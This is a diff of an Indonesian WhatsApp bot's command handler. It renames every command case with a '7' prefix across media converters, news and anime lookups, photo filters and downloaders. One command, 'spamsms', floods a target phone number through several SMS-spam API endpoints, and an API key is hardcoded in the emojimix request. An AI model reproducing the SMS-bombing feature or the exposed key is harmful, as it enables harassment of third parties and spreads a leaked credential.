-            case 'dbinary': {
+            case '7dbinary': {
             if (!m.quoted) throw `Reply pesan teks binary dengan caption ${prefix + command}`
             let { dBinary } = require('./lib/binary')
             let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
@@ -3765,7 +2745,7 @@ break
             m.reply(db)
         }
         break
-            case 'emojimix': {
+            case '7emojimix': {
 	        if (!text) throw `*Masukan emoji1+emoji2*\n_Contoh:_ ${prefix + command} ❤️+😁`
 		let [emoji1, emoji2] = text.split`+`
 		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
@@ -3775,7 +2755,7 @@ break
 		}
 	    }
 	    break
-         case 'tofoto': case 'toimage': case 'toimg': {
+         case '7tofoto': case '7toimage': case '7toimg': {
                 if (!quoted) throw 'Reply Image'
                 if (!/webp/.test(mime)) throw `*balas stiker dengan caption*  ${prefix + command}`
                 replay(mess.wait)
@@ -3790,7 +2770,7 @@ break
                 })
             }
             break
-	        case 'tomp4': case 'tovideo': {
+	        case '7tomp4': case '7tovideo': {
                 if (!quoted) throw 'Reply Image'
                 if (!/webp/.test(mime)) throw `*balas stiker dengan caption*  ${prefix + command}`
                 replay(mess.wait)
@@ -3801,7 +2781,7 @@ break
                 await fs.unlinkSync(media)
             }
             break
-            case 'toaud': case 'toaudio': {
+            case '7toaud': case '7toaudio': {
             if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video dengan Caption ${prefix + command}`
             if (!quoted) throw `Send/Reply Video dengan Caption ${prefix + command}`
             replay(mess.wait)
@@ -3811,7 +2791,7 @@ break
             XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
             }
             break
-            case 'tomp3': {
+            case '7tomp3': {
             if (/document/.test(mime)) throw `Send/Reply Video/Audio untuk convert ke MP3 , dengan Caption ${prefix + command}`
             if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio untuk convert ke MP3 , dengan Caption ${prefix + command}`
             if (!quoted) throw `Send/Reply Video/Audio untuk convert ke MP3 , dengan Caption ${prefix + command}`
@@ -3822,7 +2802,7 @@ break
             XeonBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Converted By ${ `${global.botnma}`}.mp3`}, { quoted : m })
             }
             break
-            case 'tovn': case 'toptt': {
+            case '7tovn': case '7toptt': {
             if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio dengan Caption*  ${prefix + command}`
             if (!quoted) throw `*Reply Video/Audio dengan Caption*  ${prefix + command}`
             replay(mess.wait)
@@ -3832,7 +2812,7 @@ break
             XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
             }
             break
-            case 'togif': {
+            case '7togif': {
                 if (!quoted) throw 'Reply Sticker'
                 if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                 replay(mess.wait)
@@ -3844,7 +2824,7 @@ break
                 //reply(webpToMp4.result)
             }
             break
-	        case 'tourl': {
+	        case '7tourl': {
 		//if (!quoted) throw 'Send/Reply Foto/Video/Audio/file dengan Caption ${prefix + command}'
                 replay(mess.wait)
 		let { UploadFileUgu, webp2mp4File, TelegraPh  } = require('./lib/uploader')
@@ -3859,7 +2839,7 @@ break
                 await fs.unlinkSync(media)
             }
             break
-            case 'imagenobg': case 'removebg': case 'remove-bg': {
+            case '7imagenobg': case '7removebg': case '7remove-bg': {
 	    if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
 	    if (!/image/.test(mime)) throw `Send/Reply Image dengan Caption ${prefix + command}`
 	    if (/webp/.test(mime)) throw `Send/Reply Image dengan Caption ${prefix + command}`
@@ -3885,7 +2865,7 @@ break
 	    }
 	    break
 //[ANIME MANGA MENU]\\ With apikey lol human
-case 'animes': case 'animesearch': {
+case '7animes': case '7animesearch': {
 	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} naruto`
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${global.apilol}&query=${text}`)
 	XeonBotInc.sendMessage(m.chat, { image: { url: anu.result.coverImage.large }, caption: `*〔 Anime Search 〕*
@@ -3906,7 +2886,7 @@ case 'animes': case 'animesearch': {
 *⭔ Description :* ${anu.result.description}` }, { quoted: m })      
 }
 break
-case 'mangas': case 'mangasearch': {
+case '7mangas': case '7mangasearch': {
 	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} gotoubun no hanayome`
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${global.apilol}&query=${text}`)
 	XeonBotInc.sendMessage(m.chat, { image: { url: anu.result.coverImage.large }, caption: `*〔 Manga Search 〕*
@@ -3925,7 +2905,7 @@ case 'mangas': case 'mangasearch': {
 *⭔ Description :* ${anu.result.description}` }, { quoted: m })      
 }
 break
-case 'character': case 'karakteranime': {
+case '7character': case '7karakteranime': {
 	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} miku nakano`
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${global.apilol}&query=${text}`)
 	XeonBotInc.sendMessage(m.chat, { image: { url: anu.result.image.large }, caption: `*〔 Character Search 〕*
@@ -3937,7 +2917,7 @@ case 'character': case 'karakteranime': {
 *⭔ Description :* ${anu.result.description}` }, { quoted: m })      
 }
 break
-case 'animestory': case 'storyanime': {                  
+case '7animestory': case '7storyanime': {                  
                 let anu = await fetchJson(`https://api.lolhuman.xyz/api/storynime?apikey=${global.apilol}`)               
               media = await getBuffer(anu.result)
   let buttons = [
@@ -3953,7 +2933,7 @@ case 'animestory': case 'storyanime': {
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })       
             }
           break
-          case 'neonime': {
+          case '7neonime': {
           let anu = await fetchJson(`https://api.lolhuman.xyz/api/neonimelatest?apikey=${global.apilol}`)  
           let ini = anu.result
           let result = ini[Math.floor(Math.random() * ini.length)]
@@ -3977,7 +2957,7 @@ case 'animestory': case 'storyanime': {
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })       
             }
 break
-case 'kusonimesearch': case 'kusonimes': {
+case '7kusonimesearch': case '7kusonimes': {
 	if (!text) throw `*Apa yang di cari?*\n_Contoh:_ ${prefix + command} boruto`
           let anu = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch2?apikey=${global.apilol}&query=${text}`)  
           let ini = anu.result
@@ -3999,7 +2979,7 @@ case 'kusonimesearch': case 'kusonimes': {
             }
 break
 //PHOTO EDITOR MENU]\\ With apikey lol human
-case 'wasted': case 'pencil': case 'triggered': case 'fisheye': case 'skullmask': case 'cartoon': case 'invert': case 'pixelate': case 'flip': case 'grayscale': case 'roundimage': {
+case '7wasted': case '7pencil': case '7triggered': case '7fisheye': case '7skullmask': case '7cartoon': case '7invert': case '7pixelate': case '7flip': case '7grayscale': case '7roundimage': {
 	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                 let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 	let anu = await TelegraPh(media)
@@ -4008,7 +2988,7 @@ case 'wasted': case 'pencil': case 'triggered': case 'fisheye': case 'skullmask'
                 XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/editor/${command}?apikey=${global.apilol}&img=${anu}`) }, caption: `*Photo Editor ${command}*\nBy ${global.botnma}` }, { quoted: m })      
                     }
 break
-case 'affect': case 'beautiful': case 'facepalm': case 'hitler': case 'jail': case 'jokeoverhead': case 'rainbow': case 'sepia': case 'trash': case 'wanted': {
+case '7affect': case '7beautiful': case '7facepalm': case '7hitler': case '7jail': case '7jokeoverhead': case '7rainbow': case '7sepia': case '7trash': case '7wanted': {
 	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                 let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 	let anu = await TelegraPh(media)
@@ -4017,7 +2997,7 @@ case 'affect': case 'beautiful': case 'facepalm': case 'hitler': case 'jail': ca
                 XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/creator1/${command}?apikey=${global.apilol}&img=${anu}`) }, caption: `*Photo Editor ${command}*\nBy ${global.botnma}` }, { quoted: m })      
                     }
 break
-case '1977': case 'aden': case 'brannan': case 'brooklyn': case 'gingham': case 'hudson': case 'inkwell': case 'earlybird': case 'kelvin': case 'larlk': case 'lofi': case 'maven': case 'mayfair': case 'moon': case 'perpetua': case 'nashville': case 'reyes': case 'rise': case 'slumber': case 'stinson': case 'toaster': case 'valencia': case 'walden': case 'willow': case 'gingham': case 'xpro2': {
+case '71977': case '7aden': case '7brannan': case '7brooklyn': case '7gingham': case '7hudson': case '7inkwell': case '7earlybird': case '7kelvin': case '7larlk': case '7lofi': case '7maven': case '7mayfair': case '7moon': case '7perpetua': case '7nashville': case '7reyes': case '7rise': case '7slumber': case '7stinson': case '7toaster': case '7valencia': case '7walden': case '7willow': case '7gingham': case '7xpro2': {
 let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                 let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 	let anu = await TelegraPh(media)
@@ -4027,7 +3007,7 @@ let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
 break
 
 //[News berita MENU]\\ With apikey lol human
-case 'hoax': {
+case '7hoax': {
           let anu = await fetchJson(`https://api.lolhuman.xyz/api/turnbackhoax?apikey=${global.apilol}`)  
           let ini = anu.result
           let result = ini[Math.floor(Math.random() * ini.length)]   
@@ -4052,7 +3032,7 @@ case 'hoax': {
                       XeonBotInc.send5ButImg(m.chat, txt, `Klik NEXT untuk hasil lainnya`, fatihgans, btn)
             }
 break
-case 'kumparan': case 'republika': case 'liputan6': {
+case '7kumparan': case '7republika': case '7liputan6': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4074,7 +3054,7 @@ case 'kumparan': case 'republika': case 'liputan6': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'newsinfo': {
+case '7newsinfo': {
           let anu = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=${global.apilol}`)  
           let ini = anu.result
           let result = ini[Math.floor(Math.random() * ini.length)]   
@@ -4099,7 +3079,7 @@ case 'newsinfo': {
                       XeonBotInc.send5ButImg(m.chat, txt, `By ${result.author}`, fatihgans, btn)
             }
 break
-case 'detiknews': {
+case '7detiknews': {
           let anu = await fetchJson(`https://api.lolhuman.xyz/api/detik?apikey=${global.apilol}`)  
           let ini = anu.result
           let result = ini[Math.floor(Math.random() * ini.length)]   
@@ -4122,7 +3102,7 @@ case 'detiknews': {
                       XeonBotInc.send5ButImg(m.chat, txt, `${global.fake}`, fatihgans, btn)
             }
 break
-case 'jalantikus': {
+case '7jalantikus': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4142,7 +3122,7 @@ case 'jalantikus': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'cnnindonesia': {
+case '7cnnindonesia': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4161,7 +3141,7 @@ case 'cnnindonesia': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'cnnnasional': {
+case '7cnnnasional': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4180,7 +3160,7 @@ case 'cnnnasional': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'cnninternasional': {
+case '7cnninternasional': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4199,7 +3179,7 @@ case 'cnninternasional': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'cnnekonomi': {
+case '7cnnekonomi': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/ekonomi?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4218,7 +3198,7 @@ case 'cnnekonomi': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'cnnolahraga': {
+case '7cnnolahraga': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/olahraga?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4237,7 +3217,7 @@ case 'cnnolahraga': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'cnnteknologi': {
+case '7cnnteknologi': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/teknologi?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4256,7 +3236,7 @@ case 'cnnteknologi': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'cnnhiburan': {
+case '7cnnhiburan': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/hiburan?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4275,7 +3255,7 @@ case 'cnnhiburan': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'cnnsocial': {
+case '7cnnsocial': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/social?apikey=${global.apilol}`)
  ini = anu.result
  let result = ini[Math.floor(Math.random() * ini.length)]
@@ -4298,7 +3278,7 @@ case 'cnnsocial': {
 
 //Tools internet menu  ]\\ With apikey lol human
 //https://api.lolhuman.xyz/api/translate/auto/ps?apikey=fleyvin_soft&text=Good%20morning
-case 'texttospeak': case 'tekstospeak': case 'tts': case 'gtts': {
+case '7texttospeak': case '7tekstospeak': case '7tts': case '7gtts': {
 	if (!text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} dasar anak tiktok suka pargoy di tempat umum`
 let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                 listMessage :{
@@ -4369,7 +3349,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
             XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
             }
             break
-            case 'tts2': {
+            case '7tts2': {
 	if (!text) throw `*Masukan KodeNegara+Teks*\n_Contoh:_ ${prefix + command} id+Dasar anak tiktok suka pargoy di tempat umum`
 	tas = arg.split('+')[0]
               wah = arg.split('+')[1]
@@ -4378,7 +3358,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
    XeonBotInc.sendMessage(m.chat, { audio: anu, mimetype: 'audio/mp4', ptt: true, quoted : m })
 }
               break
-              case 'tst': case 'translate': {
+              case '7tst': case '7translate': {
 	if (!m.quoted && !text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} good morning`
 //if (!text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} good morning`
 tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
@@ -4436,7 +3416,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
             XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
             }
             break
-case 'tst2': {
+case '7tst2': {
 	if (!text) throw `*Masukan KodeNegara+Teks*\n_Contoh:_ ${prefix + command} id+good morning`
 	tas = arg.split('+')[0]
               wah = arg.split('+')[1]
@@ -4448,7 +3428,7 @@ m.reply(`*〔 Translate From: ${anu.result.from},To: ${anu.result.to} 〕*
 *🌹Pengucapan:* ${anu.result.pronunciation}`)
 }
 break
-case 'ocr': {
+case '7ocr': {
 	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
 	m.reply(mess.wait)
 	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
@@ -4458,7 +3438,7 @@ case 'ocr': {
 	replay(`${ini.result}`)
 	}
 	break
-case 'shortlink': {
+case '7shortlink': {
 	if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
  	let anu = await fetchJson(api('zenz',`/shortlink?apikey=${global.apilol}&url=${text}`))
      let buttons = [
@@ -4475,7 +3455,7 @@ case 'shortlink': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'shortlink2': {
+case '7shortlink2': {
 	if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
  	let anu = await fetchJson(api('zenz',`/shortlink2?apikey=${global.apilol}&url=${text}`))
      let buttons = [
@@ -4492,7 +3472,7 @@ case 'shortlink2': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'shortlink3': {
+case '7shortlink3': {
 if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
  	let anu = await fetchJson(api('zenz',`/shortlink3?apikey=${global.apilol}&url=${text}`))
      let buttons = [
@@ -4509,7 +3489,7 @@ if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command}
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'shortlink4': {
+case '7shortlink4': {
 	if (!text) throw `*Masukan URL yang mau di short*\n_Contoh:_ ${prefix + command} https://play.google.com/store/apps/dev?id=8953653728108379529`
  	let anu = await fetchJson(api('zenz',`/shortlink4?apikey=${global.apilol}&url=${text}`))
      let buttons = [
@@ -4526,7 +3506,7 @@ case 'shortlink4': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-            case 'ssweb': case 'ssweb1': {
+            case '7ssweb': case '7ssweb1': {
                 if (!text) throw `*Masukan URL web !*\n_Contoh :_ ${prefix + command} https://youtube.com/c/xZrinva`                 
               m.reply(mess.wait)
                let buttons = [
@@ -4542,7 +3522,7 @@ case 'shortlink4': {
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
 break
-case 'sswebfull': case 'ssweb2': {
+case '7sswebfull': case '7ssweb2': {
                 if (!text) throw `*Masukan URL web !*\n_Contoh :_ ${prefix + command} https://indonesia.go.id`                 
                 m.reply(mess.wait)
                let buttons = [
@@ -4558,14 +3538,14 @@ case 'sswebfull': case 'ssweb2': {
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
 break
-            case 'resum': case 'reroomer': {
+            case '7resum': case '7reroomer': {
             	if (!text) throw `*Masukan teks untuk di resum !*\n_Contoh :_ ${prefix + command} Sebuah kaca yang dipasang di tembok belakang kelasnya tiba-tiba bergerak sendiri.\nDream - Menyanyi memang menjadi hal yang menyenangkan saat sedang kesepian. Begitu pula yang dilakukan oleh gadis berhijab dalam video berikut ini.\nGadis ini datang lebih awal ke sekolah dari murid lainnya. Melihat kondisi kelas yang masih sepi, gadis tersebut lantas menyalakan kamera dan merekam aksinya yang tengah bernyanyi.\nIde Seru Buat Lebaran! Tiktoker Bagi-Bagi Uang THR Sesuai Filter TikTok, Si Nenek Ketiban Rezeki Nomplok\n\nDengan suara merdunya, sang gadis menyanyikan lagu Agnes Monica berjudul Karena Ku Sanggup. Hingga akhirnya sebuah insiden mengejutkan terjadi. Terang saja gadis yang berada dalam video itu terkejut.\nMeski demikian, belum bisa dipastikan apakah kaca itu benar-benar bergerak sendiri atau video ini hanya rekayasa belaka. `                 
          m.reply(mess.wait)
   let anu = await fetchJson(`https://api.lolhuman.xyz/api/resoomer?apikey=${global.apilol}&text=${text}`)
  replay(anu.result)
  }
  break
-case 'spamsms': case 'smsspam': {
+case '7spamsms': case '7smsspam': {
             	if (!text) throw `*Masukan nomor target !*\n_Contoh :_ ${prefix + command} 6283110011351`                 
          m.reply(mess.wait)
   let anu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${global.apilol}&nomor=${text}`)
@@ -4579,13 +3559,13 @@ let aynu = await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${glob
  reply(`Sukses spam sms ke nomor ${text}`)
  }
  break
-case 'qrcode': case 'toqrcode': {
+case '7qrcode': case '7toqrcode': {
 	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} Aku suka sama kamu`         
 m.reply(mess.wait)        
 	XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/qrcode?apikey=${global.apilol}&text=${text}`) }, caption: `*QR Code From Teks : ${text}*` }, { quoted: m })      
 	}
 break
-case 'readqr': case 'readqrcode': {
+case '7readqr': case '7readqrcode': {
 	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
 	m.reply(mess.wait)
 	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
@@ -4595,7 +3575,7 @@ case 'readqr': case 'readqrcode': {
 replay(ini.result)
                   }
                            break
-case 'cekumur': case 'agedetect': {
+case '7cekumur': case '7agedetect': {
 	if (!quoted) throw `Send/Reply foto wajah dengan Caption ${prefix + command}`
 	m.reply(mess.wait)
 	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
@@ -4605,7 +3585,7 @@ case 'cekumur': case 'agedetect': {
 replay(`Orang tersebut kira-kira berumur  ${ini.result} Tahun`)
                   }
                            break
-case 'cekwajah': case 'facedetec': {
+case '7cekwajah': case '7facedetec': {
 	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
 	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                 let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
@@ -4614,25 +3594,25 @@ case 'cekwajah': case 'facedetec': {
                 XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/facedetect?apikey=${global.apilol}&img=${anu}`) }, caption: `Wajah detektor` }, { quoted: m })      
                 }
                 break
-            case '4l4y': case 'alay': {
+            case '74l4y': case '7alay': {
             	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
 anu = await fetchJson(`https://api.lolhuman.xyz/api/alay?apikey=${global.apilol}&text=${text}`)
 m.reply(anu.result)
 }
 break
-case 'besarkecil': case 'kecilbesar': {
+case '7besarkecil': case '7kecilbesar': {
             	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
 anu = await fetchJson(`https://api.lolhuman.xyz/api/upperlower?apikey=${global.apilol}&text=${text}`)
 m.reply(anu.result)
 }
 break
-case 'bahasapurba': case 'purba': {
+case '7bahasapurba': case '7purba': {
             	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
 anu = await fetchJson(`https://api.lolhuman.xyz/api/bahasapurba?apikey=${global.apilol}&text=${text}`)
 m.reply(anu.result)
 }
 break
-case 'randombahasa': case 'bahasarandom': {
+case '7randombahasa': case '7bahasarandom': {
             	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
 anu = await fetchJson(`https://api.lolhuman.xyz/api/randombahasa?apikey=${global.apilol}&text=${text}`)
 m.reply(anu.result)
@@ -4642,7 +3622,7 @@ break
 
 
 //[DOWNLOAD MENU]\\ WITH Apikey Lol-Human, credit (Fleyvin Software)
-case 'mediafire': case 'mdf': {
+case '7mediafire': case '7mdf': {
                    if (!text) throw `*Masukan Link Mediafire*\n_Contoh :_ ${prefix + command} https://www.mediafire.com/file/nf8gcek9mkvdlek/20220403_152001.png/file`
              	let anu = await fetchJson(api('zenz', '/mediafire', { url: text }, 'apikey'))
              asu = anu.result.link
@@ -4672,7 +3652,7 @@ case 'mediafire': case 'mdf': {
             }
           }
           break
-case 'sfile': case 'sfilemobi': {
+case '7sfile': case '7sfilemobi': {
                    if (!text) throw `*Masukan Link SfileMobi*\n_Contoh :_ ${prefix + command} https://sfile.mobi/3Ca9II8GKsP`
                    replay(mess.wait)
              	let anu = await fetchJson(api('zenz', '/sfile', { url: text }, 'apikey'))
@@ -4681,7 +3661,7 @@ case 'sfile': case 'sfilemobi': {
 		XeonBotInc.sendMessage(m.chat, {document: {url: asu }, mimetype: 'application/zip' , fileName: nama }, {quoted:m})
             }
           break
-	                  case 'tt': case 'ttdownload': case 'ttdl': case 'tiktok': case 'tiktoknowm': {
+	                  case '7tt': case '7ttdownload': case '7ttdl': case '7tiktok': case '7tiktoknowm': {
                   if (!text) throw `*Masukan Link TikTok*\n_Contoh :_ ${prefix + command} https://vt.tiktok.com/ZSdAvGKjn/`
                 replay(mess.wait)
                 let anu = await fetchJson(api('zenz', '/tiktok3', { url: text }, 'apikey'))
@@ -4698,7 +3678,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
           break
-                 case 'ttmp3': case 'tiktokmp3': case 'tiktokaudio': {
+                 case '7ttmp3': case '7tiktokmp3': case '7tiktokaudio': {
                 if (!text) throw `*Masukan Link TikTok*\n_Contoh :_ ${prefix + command} https://vt.tiktok.com/ZSdAvGKjn/`
                 replay(mess.wait)
                 let anu = await fetchJson(api('zenz', '/tiktok3', { url: text }, 'apikey'))
@@ -4718,7 +3698,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendMessage(m.chat, { audio: cnvrt, mimetype: 'audio/mpeg'}, { quoted: m })
             }
             break
-                      case 'igtv': case 'instagramtv': case 'igpost': case 'igmp4': case 'igdl': case 'igvideo': case 'instagramvideo': case 'instagrammp4': case 'instagram': {
+                      case '7igtv': case '7instagramtv': case '7igpost': case '7igmp4': case '7igdl': case '7igvideo': case '7instagramvideo': case '7instagrammp4': case '7instagram': {
                 if (!text) throw `*Masukan Link Instagram tv/post*\n_Contoh :_ ${prefix + command} https://www.instagram.com/tv/Ccn0eqaPxGx/?igshid=YmMyMTA2M2Y=`
                 replay(mess.wait)
                 let anu = await fetchJson(api('zenz', '/instagram2', { url: text }, 'apikey'))
@@ -4741,7 +3721,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
           break
-          case 'instagrammp3':  case 'igtvmp3': case 'instagramtvmp3': {
+          case '7instagrammp3':  case '7igtvmp3': case '7instagramtvmp3': {
                if (!text) throw `*Masukan Link Instagram tv/post*\n_Contoh :_ ${prefix + command} https://www.instagram.com/tv/Ccn0eqaPxGx/?igshid=YmMyMTA2M2Y=`
                 replay(mess.wait)
                 let anu = await fetchJson(api('zenz', '/instagram2', { url: text }, 'apikey'))
@@ -4767,7 +3747,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendMessage(m.chat, { audio: cnvrt, mimetype: 'audio/mpeg'}, { quoted: m })
             }
             break
-            case 'igreel': case 'instagramreels': case 'instagramreel': case 'igreels': {
+            case '7igreel': case '7instagramreels': case '7instagramreel': case '7igreels': {
                 if (!text) throw `*Masukan Link Instagram Reels*\n_Contoh :_ ${prefix + command} https://www.instagram.com/reel/CQffYpUJK5d/?igshid=YmMyMTA2M2Y=`
                 replay(mess.wait)
                 let anu = await fetchJson(api('zenz', '/instagramreel', { url: text }, 'apikey'))
@@ -4790,7 +3770,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
           break
-          case 'igreelmp3': case 'igreelsmp3': {
+          case '7igreelmp3': case '7igreelsmp3': {
                if (!text) throw `*Masukan Link Instagram Reels*\n_Contoh :_ ${prefix + command} https://www.instagram.com/reel/CQffYpUJK5d/?igshid=YmMyMTA2M2Y=`
                 replay(mess.wait)
                 let anu = await fetchJson(api('zenz', '/instagramreel', { url: text }, 'apikey'))
@@ -4816,7 +3796,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendMessage(m.chat, { audio: cnvrt, mimetype: 'audio/mpeg'}, { quoted: m })
             }
             break
-            case 'twittermp4': case 'twittervideo': case 'tw': case 'twmp4': case 'twvideo': {
+            case '7twittermp4': case '7twittervideo': case '7tw': case '7twmp4': case '7twvideo': {
                 if (!text) throw `*Masukan Link Twitter Video*\n_Contoh :_ ${prefix + command} https://twitter.com/vitaminreceh/status/1330465270595543041?t=QXZcrz2cFHV9e54Ij3lYIQ&s=19`
                 replay(mess.wait)
                 let anu = await fetchJson(api('zenz', '/twitter', { url: text }, 'apikey'))
@@ -4838,7 +3818,7 @@ case 'sfile': case 'sfilemobi': {
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
           break
-          case 'twitterimage': case 'twimage': case 'twitterfoto': case 'twfoto': case 'teitterjpg': {
+          case '7twitterimage': case '7twimage': case '7twitterfoto': case '7twfoto': case '7teitterjpg': {
